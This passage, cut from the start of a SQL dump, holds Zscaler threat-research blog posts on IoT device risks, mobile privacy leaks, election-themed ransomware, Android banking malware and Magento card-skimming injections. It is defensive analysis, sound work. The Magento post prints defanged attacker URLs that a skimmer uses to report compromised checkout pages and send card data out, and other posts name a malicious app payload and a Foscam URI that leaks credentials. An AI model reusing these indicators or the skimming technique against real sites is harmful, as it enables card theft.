20;*.data;*.bk9;*.bk8;*.r12;*.tmr;*.r18;*.locky;*.micro;*.zepto;*.cerber;*.ecc;*.ezz;*.r5a;*.exx;*.ccc;*.crypz;*.cryptowall;*.enciphered;*.cryptolocker;*.cryp1;*.lol!;*.breaking_bad;\r\n*.encrypted;*.LeChiffre;*.rrk;*.ttt;*.enigma;*.coverton;*.crjoker;*.good;*.crinf;*.keybtc@inbox_com;*.encrypt;*.zcrypt;*.aaa;*.ha3;*.surprise;*.zzz;*.wflx;*.zyklon;*.pdcr;*.EnCiPhErEd;*.xyz;*.pzdc;\r\n*.kkk;*.PoAr2w;*.czvxce;*.magic;*.odcodc;*.rdm;*.windows10;*.payms;*.p5tkjw;*.fun;*.btc;*.darkness;*.kraken;*.crptrgr;*.legion;*.kernel_time;*.kernel_complete;*.rokku;*.bin;*.kernel_pid;*.73i87A;\r\n*.kimcilware;*.SecureCrypted;*.CCCRRRPPP;*.vvv;*.kratos;*.herbst;*.payrms;*.bitstak;*.paymts;*.paymst;*.pays;*.paym;*.info;*.padcrypt;*.paymrss;*.szf', 'Ransomware', 'https://www.zscaler.com/blogs/research/look-recent-stampado-ransomware-variant');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (85, 'IoT devices in the enterprise', 'Deepen Desai', 'November 15, 2016', 'In the months prior to the recent attacks, which used Internet of things (IoT) devices to carry out massive distributed-denial-of-service (DDoS) attacks, the ThreatLabZ research team had begun studying the use of IoT devices on the networks of Zscaler customers.\r\n\r\nIn light of their notoriously poor security, we knew that IoT devices were relatively easy to compromise, so there’s been concern over the potential to use them for spreading malware, stealing credentials, leaking data, sniffing traffic, or even moving laterally on a network to scan for sensitive data. The devices themselves can also be exploited for malicious purposes, such as spying in the case of cameras. Or, as we saw last month, creating large, destructive botnets.\r\n\r\nWe analyzed data going back to July for recent IoT device footprints based on the traffic we are seeing in the Zscaler cloud. We looked at the types of devices in use, the protocols they used, the locations of the servers with which they communicated, and the frequency of their inbound and outbound communications over a two-month period (26 August 2016 to 26 October 2016). Our primary purpose was to determine if any of the devices posed a threat to customer security, and eventually we also looked at whether the devices that were used in the Dyn and KrebsOnSecurity attacks were also in use by our customers.\r\n\r\nFinally, we analyzed IoT traffic patterns on the days of the DDoS attacks to see if there had been any unusual behavior on those days, such as spikes in bandwidth use or variations in the destination of IoT traffic.\r\n\r\nWhat we found\r\n\r\nThe most common devices we saw were cameras, home entertainment systems, printers, and IP phones. Many of the devices we observed were still using plain-text HTTP protocol for authentication as well as firmware updates, which makes their communication vulnerable to sniffing and Man-in-The-Middle (MiTM) attacks.\r\n\r\nWhat we didn’t find\r\n\r\nAn analysis of the IoT traffic on the attack days did not show traffic spikes that would indicate that any of the devices had been compromised. Therefore, we do not believe that any of our customers’ devices were involved in either botnet. Mirai, the malware responsible for the recent attacks, uses the Telnet and SSH protocols to infect devices. But most enterprises will not allow inbound open external access over these protocols, whereas access over HTTP and HTTPS are more common. While there are many devices on our customers’ networks that are similar to those used in the attacks, none of them appeared to be compromised or involved in the recent attacks based on our research.\r\n\r\nWhat follows is a presentation of our findings. At the end of the report, we will present some questions and answers about IoT devices, protecting your organization from potential threats, and  what to do if you believe a device has been compromised.\r\n\r\nZscaler Cloud – Enterprise IoT traffic research\r\n\r\nFor this report, we have grouped the IoT devices based on their functionality.\r\n\r\nVideo Monitoring & Surveillance Cameras\r\n\r\nGeographic distribution of servers with which these devices are communicating:\r\n\r\n\r\n\r\n1. Flir FX wireless HD monitoring camera\r\n\r\n\r\n\r\nThe FLIR FX™ is a wireless HD camera that allows you to see the day in a minute and keep an eye on the things you care about. We observed multiple Flir FX devices connecting to FLIR services servers on a regular basis.\r\n\r\nThe traffic hits are displayed in the following graph.\r\n\r\n\r\n\r\nSecurity concerns:\r\nThis device was found to be communicating over plain-text HTTP with the FLIR services server for firmware updates without any authentication tokens.\r\n\r\n2. Canary Home Security System\r\n \r\n\r\n\r\n\r\nCanary Home security system is an all-in-one security system which can stream real-time video of your home and has features like, built-in siren, motion-activated recording, HomeHealth Technology and Intelligent notifications.\r\n\r\nThe traffic hits are displayed in the following graph.\r\n\r\n\r\n\r\nSecurity concerns:\r\nNone\r\n\r\n3. Foscam\r\n\r\n\r\n\r\nFoscam is a IP surveillance camera with ability to remote pan/tilt. It connects to a web server to stream video to desktop or smartphone from anywhere on local network or over the Internet.  \r\n\r\nThe traffic hits are displayed in the following graph.\r\n\r\n\r\n\r\nSecurity concerns:\r\nThis device was leaking user credential information over HTTP in the URI. For example,\r\nxxx.xxx.xxx.xxx:yyy/snapshot.cgi?cmd=snapPicture&user=admin&pwd=password\r\n\r\n4. Dahua DH Security Camera\r\n\r\n\r\n\r\nDahua DH Security Cameras are networked IP cameras that allow video surveillance over the internet. Dahua Technology is one of the leading product and solution provider in the global video surveillance industry.\r\n\r\nThe traffic hits are displayed in the following graph.\r\n\r\n\r\n\r\nSecurity concerns:\r\nWeak default credentials and communication over HTTP makes the communication susceptible to sniffing and MiTM attacks.\r\n\r\n\r\n5. Axis Camera\r\n\r\n\r\n\r\nAxis designs cameras to cover a variety of application needs, from robust outdoor cameras for harsh climates, to discrete products for sensitive environments. We observed communication from networked Axis IP cameras.\r\n\r\nThe traffic hits are displayed in the following graph.\r\n\r\n\r\n\r\nSecurity concerns:\r\nWe found the remote management console of the camera to be using basic HTTP based authentication, which makes the communication susceptible to sniffing and MiTM attacks.\r\n\r\nSmart TVs and Entertainment devices\r\n\r\nGeographic distribution of servers with which these devices are communicating:\r\n\r\n\r\n\r\n1. Haier Android TV\r\n\r\n. \r\n\r\n\r\nHaier Android TV is smart TV which integrates Internet and interactive “Web 2.0” features. It connects to the internet to provide host of features like streaming video content to web connected apps to provide a technological convergence between computers, flat screen television sets and set-top boxes.     \r\n\r\nThe traffic hits are displayed in the following graph.\r\n\r\n\r\n\r\nSecurity Concerns:\r\nThe security concern with respect to smart TVs in general is the use of outdated libraries which could be exploited to gain control over the system.\r\n\r\n\r\n2. Chromecast media player\r\n\r\n\r\n\r\nChromecast media player is a streaming device by google that plugs into HDMI port of TV. It allows streaming content from mobile devices like iPhone, iPad, Android phones, and various laptops.\r\n\r\nThe traffic hits are displayed in the following graph.\r\n\r\n\r\n\r\nSecurity concerns:\r\nNone\r\n\r\n3. Roku streaming TV and media player\r\n\r\n\r\n\r\nRoku is a streaming device which allows streaming movies, TV shows, live sports, news and music to TV. It allows users to connect to paid content providers and stream contents from them.\r\n\r\nThe traffic hits are displayed in the following graph. \r\n\r\n\r\n\r\nSecurity concerns:\r\nNone\r\n\r\nSmart Network Printers & Scanners\r\n\r\nGeographic distribution of servers with which these devices are communicating:\r\n\r\n\r\n\r\n1. Epson Printer\r\n\r\n\r\n\r\nThe Epson printer is a wireless/wired connectivity printer designed for home office environment. It allows to print sharp, professional-quality documents from desktop, iPad, iPhone, Android tablets or smartphones.\r\n\r\nThe traffic hits are displayed in the following graph.\r\n\r\n\r\n\r\nSecurity concerns: \r\nNone\r\n\r\n\r\n2. HP Designjet Printers\r\n\r\n\r\n\r\nHP Designjet printers are easy to use large-format printers which are web-connected to allow prints from anywhere over the internet.\r\n\r\nThe traffic hits are displayed in the following graph.\r\n\r\n\r\n\r\nSecurity Concerns:\r\nNone\r\n\r\n3. Fuji Xerox Printer\r\n\r\n\r\n\r\nFuji Xerox printers are networked printers which are designed for high print performance and have a host of powerful productivity tools designed to make daily office tasks more efficient.\r\n\r\nThe traffic hits are displayed in the following graph.\r\n\r\n\r\n\r\nSecurity concerns:\r\nWe observed print monitors connecting to maintenance logging modules without any authentication. \r\n\r\nUPDATE:\r\nWe were informed by Fuji Xerox authorized dealer at Fuji Xerox Business Center Toowoomba that the communication that we were seeing was unencrypted traffic being sent to a non SSL based management platform, and they have initiated change request to move the service to a SSL platform so that the communication is secure. It is important to note that the maintenance/logging module is NOT a Fuji Xerox product and is not authorized by Fuji Xerox.\r\n\r\nNetwork printers are usually installed and setup in a way to make them reachable by most users on the internal networks. It is important to ensure that these printers are running the latest security patches by keeping the firmware up to date.\r\n\r\nDigital & Network Video Recording systems (DVR/NVR)\r\n\r\nGeographic distribution of the servers with which these devices are communicating:\r\n\r\n\r\n\r\n1. VideoEdge NVR\r\n\r\n\r\n\r\nVideoEdge NVR is a powerful NVR system which can be used to manage surveillance in active environments, onsite and remotely. Using a victor client with VideoEdge allows high-performance video streaming, audio, motion metadata.\r\n\r\nThe traffic hits are displayed in the following graph.\r\n\r\n\r\n\r\nSecurity concerns:\r\nWeak default credentials and communication over HTTP makes the communication susceptible to sniffing and MiTM attacks. \r\n\r\n\r\n2. D-Link DNR-202L\r\n\r\n\r\n\r\nD-Link DNR is a Camera Recorder to simultaneously stream, record and playback upto 4 D-Link Wi-Fi camera to provide home or small business security.\r\n\r\nThe traffic hits are displayed in the following graph.\r\n\r\n\r\n\r\nSecurity concerns:\r\nWeak default credentials and communication over HTTP makes the communication susceptible to sniffing and MiTM attacks.\r\n\r\nIP Phones\r\n \r\n\r\nGeographic distribution of the servers with which these devices are communicating:\r\n\r\n \r\n\r\n\r\n\r\n1. Panasonic KX-TGP500B04\r\n\r\n\r\n\r\nThe Panasonic KX-TGP500B04 is a DECT solution which includes base unit and a DECT cordless handset. It enables the users to use range of services provided by the carrier such as Call Forward, Voice Mail etc. This system can also be used as a wireless terminal.\r\n\r\nThe traffic hits are displayed in the following graph.\r\n\r\n\r\n\r\nSecurity concerns:\r\nThese devices were found to be downloading a root certificate as well as performing authentication over plain-text HTTP protocol making them vulnerable to sniffing and MiTM attacks.\r\n\r\n\r\n2. Yealink SIP phones-T46G\r\n\r\n\r\n\r\nThe Yealink SIP-T46G IP phones are designed for executive users and professionals. They make use of Yealink Optimal HD technology to deliver clear, life-like voice communications with features like Gigabit Ethernet, variety of device connections and programmable keys.\r\n\r\nThe traffic hits are displayed in the following graph.\r\n\r\n\r\n\r\nSecurity concerns:\r\nThese devices were found to be using basic HTTP authentication.\r\n\r\nIoT in the enterprise    \r\n\r\nIoT devices present a unique threat, because of their minimal security and their sheer numbers.The Mirai malware has shown us how these devices can wreak widespread havoc through targeted DDoS attacks. But what else do we need to know about these devices? Are there some that should be banned from the enterprise? What do we tell employees who are bringing them from home?\r\n\r\nWhat follows is a brief Q&A to help you form your policies around the use of IoT devices in your organization.\r\n\r\n1. How would you know if your device was used in an attack, like the one on Dyn?\r\n\r\nYou probably wouldn’t. If a device is used in an attack while in the enterprise, you would likely see a spike in traffic and abnormality in the traffic destination, as the device bombards the victim. If there are many devices involved, their high bandwidth use would slow your overall traffic. \r\n\r\n2. What can people do if they think their devices were used in an attack?\r\n\r\nOur recommendation is to reset the device in question to factory default settings. Following the reset, change the default management credentials to something more secure (see below) before plugging the device back on the network.\r\n\r\nIMPORTANT NOTE: Many IoT devices support multiple management protocols (SSH/Telnet/HTTP/HTTPS) over the same network interface. This means that changing the user credentials for the web administrator panel is not enough because your device may be reachable over other supported protocols from external networks. We strongly recommend restricting the inbound management access from external networks to HTTPS only.\r\n\r\n3. Is there anything we can do to make sure IoT security is acceptable?\r\n\r\nRecommendations for the user/enterprise:\r\n\r\nA) Restrict access to the IoT device as much as possible from external networks. Block unnecessary ports from external access.\r\n\r\nB) Change the default credentials to something more secure\r\n\r\nC) If possible, enterprises should install IoT devices on isolated networks (to prevent lateral movement), with restrictions on both inbound and outbound network traffic.\r\n\r\nD) Enterprises should invest in setting up a process to apply regular security and firmware updates to IoT devices, in addition to securing the network traffic.\r\n\r\nRecommendations (wishlist?) for IoT manufacturers:\r\n\r\nA) IoT device manufacturers need to start enforcing default password change as part of device installation. They should also ensure that the password changes are reflected for all supported management protocols. \r\n\r\nB) Security and firmware updates should be automated.\r\n\r\nCredit to Rohit Hegde for helping with the IoT traffic analysis', 'Analysis;Compromise', 'https://www.zscaler.com/blogs/research/iot-devices-enterprise');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (86, 'Are mobile apps a leaky tap in the enterprise?', 'Viral Gandhi', 'October 20, 2016', 'In almost every enterprise, mobile and cloud represent a large and growing proportion of overall traffic. While they offer many advantages in productivity, they also bring about new challenges for organizations trying to simplify their infrastructures while maintaining critical security controls.\r\n\r\nThe growing number of mobile devices, and the vast marketplace for self-serve apps, has opened the door to data loss and security breaches. In this blog, we will highlight some of the trends we’ve seen in the Zscaler cloud, particularly as they pertain to mobile privacy and data leakage.\r\n\r\nThe report\'s highlights can be viewed in our infographic. For more details, continue reading below.\r\n\r\n\r\n\r\nEach quarter, we see more than 45 million transactions related to mobile devices going through our cloud. The majority of the privacy-related information we see falls into one of three categories:\r\n\r\n\r\n	Device metadata\r\n	Location\r\n	Personally identifiable information (PII)\r\n\r\n\r\nAndroid devices\r\n\r\nAndroid devices comprise around 20 million of the transactions we see, in which approximately 0.3 percent are resulting in some level of privacy leakage.\r\n\r\n                                                            Android privacy traffic\r\n\r\nThe following graph details the leakage of privacy-related data of the Android platform.\r\n\r\n            \r\n\r\n                                             Breakdown of privacy data - Android\r\n\r\nBreakdown of privacy data – Android\r\n\r\nOf all the leaks, 58 percent are related to device metadata leakage, in which apps are sending identifying information, such as IMEI, MAC, IMSI numbers, Network, OS, SIM card information, manufacturer etc to their servers or ad-servers in clear text. Such data can be leveraged for tracking the device and creating targeted attacks.\r\n\r\nAnother high percentage of leaks — 39.3 percent — are related to the user’s location, including exact latitude and longitude coordinates. \r\n\r\nThe remaining three percent of transactions result in PII leakages, including the user’s mobile number and email addresses.\r\n\r\nOne percent of privacy leakages are observed from malicious transactions, and the rest are related to Android app usage.\r\nThe geographic distribution of Android traffic that is leaking data is shown in the following graph.\r\n\r\n                                                                      \r\n\r\n                                           Geographic distribution - Android \r\n\r\niOS devices\r\n\r\nIn iOS, we see approximately 26 million transactions quarterly through our cloud, and 0.5 percent result in privacy-related information being sent.\r\n\r\n\r\n\r\n                                                            iOS privacy traffic \r\n\r\nThe following is a breakdown of privacy data being leaked on the iOS platform.\r\n\r\n\r\n\r\n\r\n                                        Breakdown of privacy data - iOS\r\n\r\nBreakdown of privacy data – iOS\r\n\r\nOf all iOS transactions that result in privacy-related information being sent, 72.3 percent of the transactions are related to the user\'s device information.\r\n\r\nAn additional 27.5 percent of transactions are resulting in the user\'s location being sent, and 0.2 percent of transactions result in sending PII-related information.\r\n\r\nOf all the transactions in which privacy-related information is being sent, five percent of them are the result of malicious infections.\r\n\r\nThe geographic distribution for iOS privacy-related traffic is shown below.\r\n\r\n                                                                       \r\n\r\n                                               Geographic distribution - iOS\r\n\r\nThe potential for long-term threats\r\n\r\nThese statistics demonstrate that significant amounts of personal data can be leaked simply by tapping into any organization’s traffic; in our cloud alone we saw nearly 200,000 examples of such leaks. All that leaking data can be leveraged for more sophisticated attacks.\r\n\r\nBecause hardware identifiers like MAC, GSM IMEI, IMSI, and UDID are globally unique and do not change over the lifetime of a device, the collection of such IDs allows for both tracking and physical device association. These identifiers can be exploited by a range of attacks, from mobile privacy to targeted denial-of-service; for example, a GSM air interface attack where the attacker must first know the IMEI of the intended victim, a remote SMS denial-of-service attack, or remote SIM card rooting, among others.\r\n\r\nThe exact location of any person is highly valuable in this global era, where lots of spying and spoofing are done; such information can lead to mass compromisation and/or targeted attacks. Phone numbers and email addresses are the quickest way to reach any individual, and can be leveraged for spamming and phishing attacks.\r\n\r\nDon’t count on the developers to protect you\r\n\r\nA study by IBM & The Ponemon Institute shows that, of the 400 organizations studied, almost 40 percent do not scan the apps they develop for security vulnerabilities. Of those that do scan their apps before releasing them to market, only 15 percent test them as frequently as they should. And, even more worrisome, 50 percent of those that develop mobile apps do not allocate any budget at all to testing for security vulnerabilities.\r\n\r\n\r\n\r\nBYOD and the self-serve application market quickly became mainstream and are now deeply rooted in organizations. But observing the leakage from these apps — and the developers’ minimal security investments — means that organizations must take steps to protect their users and the broader network infrastructure and data assets. They should be applying strict MDM policies and educating employees about app security in an effort to stave off any kind of data loss or security breach.', '', 'https://www.zscaler.com/blogs/research/are-mobile-apps-leaky-tap-enterprise');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (87, 'Threat Campaigns during the U.S. Election', 'Sameer Patil', 'October 18, 2016', 'U.S. presidential elections are among the most followed political events in the world. Many U.S. policies, as they apply to foreign affairs, are dependent upon the outcome of the race as well as the political party that holds the majority of the U.S. Congress. Followers of the campaigns are interested in knowing details about the candidates and the inner workings of the American political machinery. If there’s a secret document to be found — unflattering pictures, unedited audio or video, damning emails, or all of the above — you can be sure that hackers are leaving no stone unturned to find it.\r\n\r\nBut hackers aren’t just targeting the powerful political players. They’re targeting the rest of us, too. They’re using this drama-filled election season as a backdrop for campaigns of their own, which have included ransomware, adware, hoax articles, and more. The theme may be unique to the election, but the attacks are based on standard techniques for spreading malware.\r\n\r\nIn this blog, ThreatLabZ, the research team at Zscaler, will describe a few of the campaigns we’ve come across.\r\n\r\n \r\n\r\nRansomware attacks   \r\n\r\nAttackers are taking advantage of the exciting political climate to use spam email as a way to deliver ransomware.\r\n\r\n\r\n\r\nFigure 1: Spam email screenshot.\r\n\r\n \r\n\r\nThe attacker sends spam email (containing a malicious attachment) with the subject:\r\n“Últimos resultados das 2016 primárias presidenciais dos Estados Unidos.”\r\n(English translation: “Latest results of the 2016 presidential primaries of the United States.”)\r\n\r\nThe attachment is a Portable Executable (PE) file with an Adobe PDF icon, which is used to disguise the attachment as an actual PDF document. If the “hide extensions” option is enabled on the user’s system, there is a greater risk that the user will click and execute the attachment, believing it is a PDF document. Furthermore, to imitate an actual PDF document, the executable will drop and open a decoy document, which appears to be related to the subject of the spam email.\r\n\r\nThe attached executable will drop the ransomware file at the location \\%AppData%\\Roaming\\ with the name smrss32.exe. The encryption key is kept in the file Ref#_2c80aab5f2e7.key and an image that displays the ransom message is dropped as Ref#_2c80aab5f2e7.bmp.\r\n\r\n\r\n\r\nFigure 2: Decoy document – 2016 Primary Election Results_USA TODAY.pdf\r\n\r\n \r\n\r\n\r\n\r\nFigure 3: Ransom message screenshot.\r\n\r\n \r\n\r\nWhen smrss32.exe is executed, it will read the Ref#_2c80aab5f2e7.key file, which contains a Base64 encoded string, the encryption key used by the ransomware to encrypt the files.\r\n\r\n\r\n\r\nFigure 4: Reading the encryption key.\r\n\r\n \r\n\r\nThis particular strain of ransomware is using the “Rijndael symmetric encryption algorithm” to encrypt the victim’s files. Because it is symmetric encryption, victims can get their files decrypted without paying the ransom, provided they keep a copy of the ransomware executable or the dropped key file.\r\n\r\n\r\n\r\nFigure 5: Encryption routine using “Rijndael symmetric encryption algorithm”\r\n\r\n \r\n\r\nRansomware will enumerate all the victim’s drives, including local, removable, and network mapped. Then it will start enumerating folders, except for the ones in its exclusion list shown below. The .encrypted file extension is added to the encrypted files.\r\n\r\n\r\n\r\nFigure 6: Folder exclusion list.\r\n\r\n \r\n\r\nAlso spotted was spoofed ransomware, which called itself \"THE DONALD TRUMP RANSOMWARE.\"\r\n\r\n\r\n\r\nFigure 7: DONALD TRUMP spoofed ransomware.\r\n\r\n \r\n\r\nThis ransomware is written in Visual Studio.Net. Based on the timestamp of the executable, we found that it was compiled on \"Fri Aug 19 18:4”5:07 2016.” We call it spoofed ransomware because, although the ransomware does have code to encrypt files using AES, it does not actually encrypt files or ask for ransom.\r\n\r\n\r\n\r\nFig 8: Code snippet of AES encryption.\r\n\r\n \r\n\r\nInstead, it will only rename the files with Base64 encoding of the actual file name and append the .ENCRYPTED extension. Further, it renames only those files that are kept in the Encrypt folder at the path where the ransomware executable is launched. There is a button called “Unlock Files”; clicking on this button will rename the files back to their original names.\r\n\r\n\r\n\r\nFig 9: Code snippet used for renaming files.\r\n\r\n \r\n\r\nThis ransomware may be in a development or testing phase and may include actual ransomware actions at a later point of time.\r\n\r\n\r\n\r\nFig 10: The extensions targeted by the DONALD TRUMP ransomware.\r\n\r\n \r\n\r\nAdware campaigns\r\n\r\nAdware propagating campaigns have also been circulating torrent downloading executable files named after the slogan of the Trump campaign. Upon execution, the adware doesn’t download a torrent file; instead, it opens a browser on the user’s machine and takes the user to a potentially unwanted program (PUP) download page. Following redirection, the URL is responsible for deciding which PUP application download page should be displayed:\r\nhttp://piroga[.]space/pages/inmon/im-typ.html\r\n\r\n\r\n\r\nFig 11: A PUP site claiming to be a trusted software download page.\r\n\r\n \r\n\r\n \r\n\r\n\r\n\r\nFig 11: A snapshot showing the number of times Zscaler has protected its users from visiting the malicious adware site over one month.\r\n\r\n \r\n\r\nHoax articles\r\n\r\nHoax articles have also been seen in circulation. One example shows a picture of Donald Trump lying dead due to heart attack. Such provocative imagery serves as an easy method for hackers to trick users into clicking malicious links.\r\n\r\n\r\n\r\n \r\n\r\nConclusion\r\n\r\nZscaler ThreatlabZ is actively monitoring these campaigns and ensuring coverage for Zscaler customers. We recommend that users take extra care in the sites they visit and, in particular, use caution when clicking links or opening email messages from untrusted sources.\r\n\r\nWriteup by: Manohar Ghule, Sameer Patil, Dhanalakshmi PK', '', 'https://www.zscaler.com/blogs/research/threat-campaigns-during-us-election');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (88, 'Android malware targeting South Korean mobile users', 'Shivang Desai', 'September 27, 2016', 'In a recent cycle of malware hunting, ThreatLabZ came across a malicious Android application specifically targeting South Korea. There have been a few attempts in the past to target South Korea, in which malicious apps were either trying to pose as bank apps or as services apps. But the malicious app we recently came across was trying to invade security mechanisms by portraying itself as a security app required for financial transactions for South Korean Banks.        The malicious app portrays itself as a version of V3 Mobile Plus. V3 Mobile Plus is a legitimate product of AhnLab, a South Korea-based company that sells antivirus software, online security, network security appliances, and more, including security software for online games and the mobile web.     According to AhnLab, V3 Mobile Plus is a mobile transaction security solution that provides real-time detection of smartphone malware. (Important: our analysis discusses the fake app and NOT the actual V3 Mobile Plus app from AhnLab, which is a legitimate app found on Google PlayStore.)      Overview    V3 Mobile Plus is an app that is required for Android devices to perform online functions within some well-known South Korean banks. It is likely that the attacker chose to develop a fake version of this app as a way to target a large pool of users.       The malware poses as the “V3 Mobile Plus” application and asks for administrator rights upon launch. After claiming admin rights, it hides itself, which makes victim think the app has been removed/deleted from device. In reality, the app asynchronously runs services in the background, hidden from user view. The main purpose of the malware is to steal the victim’s SMS messages and authentication certificates used in the National PKI (Public Key Infrastructure) scheme, and send it to its C&C (Command & Control) server.     The flowchart below illustrates the process followed by this malicious app.           	  		  			  		  		  			Flowchart  		  	           Technical Details    Displayed App Name : V3 Mobile Plus    Url : hxxp://********.com/p*****.apk    Package Name : com.qbjkyd.rhsxa         Once a victim installs the malicious app, the app asks for administrator rights, which give the app the ability to lock the victim completely out of his or her Android device.    These screenshots show the malware in action:      	  		  			  		  		  			App Icon & Admin Rights  		  	           Once the administrator rights have been granted, the malware hides its icon, making the victim think that the app must have been removed or deleted. The screenshot below shows the code exhibiting this functionality:      	  		  			  			  			  		  		  			  			Admin permission & Icon Hiding  			  		  	           Following the function of hiding itself, a background service requests a new location, where messages and authentication certificates will be sent. Once the request is successful, the malicious app receives the C&C address, as seen below:      	  		  			  		  		  			Request for C&C location  		  	           Once the response is received, malicious app extracts the location and stores it locally.       	  		  			  		  		  			C&C location extraction  		  	        SMS Stealing.    After the location is received and extracted, the malware is up and running, ready to steal the SMS message as soon as it arrives on the device. A request, along with the device\'s IMSI number, phone number, and contents of the SMS message are sent to C&C.     It was found that the malicious app steals the message and cancels the broadcast, which leaves the victim unaware of any new messages.    The screenshot below shows the stolen message from the victim and shows it being sent to C&C:      	  		  			  		  		  			Stolen SMS messages  		  	           Stealing Authentication Certificates.    Our research further revealed that S.Korean users are entitled to use NPKI (National Public Key Infrastructure) to enhance their security.   Banks generally use NPKI information during financial transactions.           	  		  			  		  		  			Authentication certificate location  		  	           The malware in our analysis has been designed to steal these authentication certificates stored in a victim’s device. It looks for an NPKI folder in the device and, if found, the malicious app compresses the content of the folder and sends it to C&C server. Note that the C&C location is the one sent in the first request. The following screenshot shows the functionality in action:       	  		  			  		  		  			Compressing NPKI information  		  	             	  		  			  		  		  			Uploading NPKI information  		  	        As of now, this malicious app was trying to detect two security based apps, namely V3 Mobile Plus 2.0 and ALYac Android.    If it found these two apps installed on the device, we discovered that it wasn’t able to initiate them.    This functionality seems to be under development.       	  		  			  		  		  			Targeted Package Names  		  	           We believe the new package names will be added and the malicious app will target these and other security apps in future. We are keeping an eye on such activities.       Zscaler customers are safe from such malicious apps, as the Zscaler cloud has implementations that provide different levels of preventive measures to tackle such attacks. As a preventive measure for other users, its always advisable to install apps from trusted Android stores like Google Playstore.    Mitigation:    The malware is designed to be persistent on a device, which means it does not allow the the victim to uninstall it.     But it can be removed by following these steps:      	Boot device into safe mode (Please note that entering \"safe mode\" varies depending on your device). Safe mode boots the device with default settings without running third party apps.  	   	Uninstalling such malwares from device requires you to first remove administrator privilege. To do the same, go to Settings --> Security --> Device Administrator and select the malicious app, then deactivate.  	   	Once this is done, you can go to Settings --> Apps --> Uninstall malicious app.', 'Mobile', 'https://www.zscaler.com/blogs/research/android-malware-targeting-south-korean-mobile-users');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (89, 'Compromised Websites Delivering Tech Support Scams and Credit Card Hijacks', 'Dhanalakshmi', 'September 17, 2016', 'Introduction: \r\n\r\nTech support scams and credit card hijacking attacks are not new. These types of cyber-fraud have been seen in the wild as supported extensions for Internet Explorer, Firefox, and Chrome; they become distributed through various monetization platforms during installation. \r\n\r\nZscaler recently observed upticks in compromised websites that deliver tech support popups and card hijacking attacks to unwitting users. A disproportionately large number of legitimate social media sites have been hacked to silently redirect visitors to a series of malicious sites in order to show fake tech support popups or to steal credit card information.\r\n\r\nDotNetNuke Compromised sites serving Tech support popups:\r\n\r\nSimilar to exploit kits, the new tech support popup scams are targeting the websites that run on the DotNetNuke (DNN) content management system. The fake tech support pages are used by cyber-criminals to promote their remote support services via scareware tactics. These bogus pop-up ads will state that a user’s computer is infected and will instruct the the user to call paid support service to remove the infection. \r\n\r\nOver a period of three months, we have seen around 2,000 distinct pages with injected malicious JavaScript.\r\n \r\n\r\n  \r\n\r\nFigure 1: Infection stats for Tech support popup\r\n\r\nThese dynamically injected JavaScripts have appeared in the compromised page after the end of form as shown below:\r\n\r\n  \r\n\r\nFigure 2: Injected JavaScript on compromised sites\r\n\r\nThe injected blurb of JavaScript is heavily obfuscated, and during run time it loads an ActiveX component with a malicious iFrame. This iFrame then redirects to “.top” gate, which is shown in the deobfuscated code below: \r\n\r\n  \r\n\r\nFigure 3: De-obfuscated JavaScript with iFrame\r\n\r\nThe cyber-criminals are employing the subsequent redirections before delivering the final tech support popup message in order to conceal the attack. The below image shows the fake tech support popup message.\r\n\r\n  \r\n\r\nFigure 4: Tech support popup \r\n\r\nThis particular variant also drops an audio file called “help-msg.mp3,” which is used to instruct the user to call the tech support toll-free number for the removal of a Backdoor Trojan from the user’s computer.\r\n\r\nThe following is the pastebin link to the list of DotNetNuke (DNN) websites compromised through this campaign:\r\n\r\nhttp://pastebin.com/fbAU1m1T\r\n\r\nCompromised eCommerce sites serving Magento Credit Card Hijack attack: \r\n\r\nMagento eCommerce is a leading platform used by many websites for integrating payments into their portals. One-page and one-step checkout plugins reduce the number of steps required in the payment process. The credit card hijack attack is not new, but it remains a threat and can lead to sensitive data leakage if a user is not careful enough to identify fake forms in the payment pages of any genuine website.\r\n\r\nThe affected Magento platforms includes multiple versions of Community Edition as well as Enterprise Edition. We have found that most of the sites which had Magento eCommerce version 1.9 were injected with malicious JavaScript code.Here is screenshot of an injected JavaScript code in the compromised webpage:\r\n\r\n \r\n\r\n    \r\n\r\nFigure 5: Injected javascript in Magento compromised site \r\n\r\nThe credit card hijacking is carried out in two steps:\r\n1. Send status to server about the compromised site. A GET request is sent to \"jqueryapi[.]info\" with a \"ref\" parameter to inform the server about the compromised site URL. For example: \r\njqueryapi[.]info/?getsrc=ok&ref=&url=https%3A%2F%2Fsite.example.com%2Fcheckout%2Fonepage\r\n\r\n2. Injecting the fake credit card form and stealing user data. The script checks for the presence of the following three strings in the URL:  \"onepage, checkout, onestep\" to confirm that it’s the payment page. Then it injects HTML phishing content in the site, as shown below:\r\n\r\n\r\n    \r\n\r\nFigure 6: Phishing form for stealing Credit Card details  \r\n\r\nThe user, believing that this is a genuine payment page, is tricked into giving away credit card details. In the background, it continues to check for user-entered values every five seconds. Once the user enters the credit card details, the form content is sent as POST data to the js-save[.]link without the user’s consent.\r\n\r\nTo avoid detection in static analysis, some part of this script is downloaded from an external source (which is “hxxps://js-save[.]link/js-save/mage[.]js” in this case), while the remaining script is present in the compromised page with four to five levels of obfuscation.\r\n\r\nZscaler ThreatLabZ observed around 400 distinct domains compromised by this campaign over three months as shown below: \r\n\r\n \r\n\r\n  \r\n\r\n Figure 7: Infection stats for Magento Credit Card hijack attacks\r\n\r\nPastebin link for list of compromised sites: \r\nhttp://pastebin.com/psa14xY5\r\n\r\nConclusion: \r\n\r\nThese popular content management systems and platforms remain an attractive target for cyber-criminals. At this stage it is not clear how these sites using the DNN CMS or the Magento eCommerce platform become infected. The attacks may be achieved through server administrator credential compromise or by exploiting an unknown vulnerability in the CMS/platform. It is extremely important for site administrators to keep their websites patched with latest security updates.\r\n\r\nZscaler ThreatLabZ is actively monitoring the threats related to the tech support scams and Magneto credit card hijack campaign. \r\n\r\n- Writeup by Dhanalakshmi PK and Sameer Patil', 'Compromise;Scam', 'https://www.zscaler.com/blogs/research/compromised-websites-delivering-tech-support-scams-and-credit-card-hijacks');
